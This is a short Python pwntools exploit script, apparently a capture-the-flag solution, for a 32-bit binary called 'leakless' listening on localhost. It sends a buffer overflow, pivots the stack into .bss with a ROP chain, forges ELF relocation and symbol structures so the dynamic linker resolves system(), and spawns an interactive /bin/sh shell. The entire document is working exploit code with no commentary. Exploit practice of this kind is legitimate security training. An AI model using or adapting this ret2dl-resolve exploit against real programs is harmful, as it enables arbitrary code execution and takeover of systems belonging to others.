from pwn import *

elf = ELF("./leakless")
sock = remote("localhost", 2000)
_ = raw_input()

addr_plt = 0x080483b0
rop_pop3 = 0x08048699
rop_pop_ebp = 0x0804869b
rop_leave = 0x080484a5

addr_relplt = 0x08048354
addr_dynsym = 0x080481cc
addr_dynstr = 0x0804828c
addr_bss    = 0x0804a030

fname = "system" + "\x00"
farg  = "/bin/sh" + "\x00"
base_stage = addr_bss + 0x800
addr_reloc = addr_bss + 0xa00
addr_sym = addr_bss + 0xa80 | (addr_dynsym & 0xF)
addr_str = addr_bss
addr_arg = addr_str + len(fname)

""" Elf32_Rel """
reloc = p32(elf.got['exit'])
reloc += p32((((addr_sym - addr_dynsym) / 0x10) << 8) | 7)
""" Elf32_Sym """
sym = p32(addr_str - addr_dynstr)
sym += p32(0)
sym += p32(0)
sym += p32(0x12)

def craft_read(addr, size):
    payload = p32(elf.plt['read']) ## read(stdin, addr, size)
    payload += p32(rop_pop3)
    payload += p32(0)    # fd
    payload += p32(addr) # buf
    payload += p32(size) # size
    return payload

""" Stage 1 """
payload1 = "A" * 0x4c
payload1 += craft_read(base_stage, 0x80)
payload1 += craft_read(addr_reloc, 0x8)
payload1 += craft_read(addr_sym, 0x10)
payload1 += craft_read(addr_str, len(fname))
payload1 += craft_read(addr_arg, len(farg))
payload1 += p32(rop_pop_ebp) ## esp = base_stage
payload1 += p32(base_stage)
payload1 += p32(rop_leave)
payload1 += "A" * (0x100 - len(payload1))

""" Stage 2 """
reloc_offset = addr_reloc - addr_relplt
payload2 = "AAAA"
payload2 += p32(addr_plt)
payload2 += p32(reloc_offset) # orig: push 0x0
payload2 += "XXXX"
payload2 += p32(addr_arg)
payload2 += "A" * (0x80 - len(payload2))

sock.send(payload1)
sock.send(payload2)
sock.send(reloc)
sock.send(sym)
sock.send(fname)
sock.send(farg)
sock.interactive()
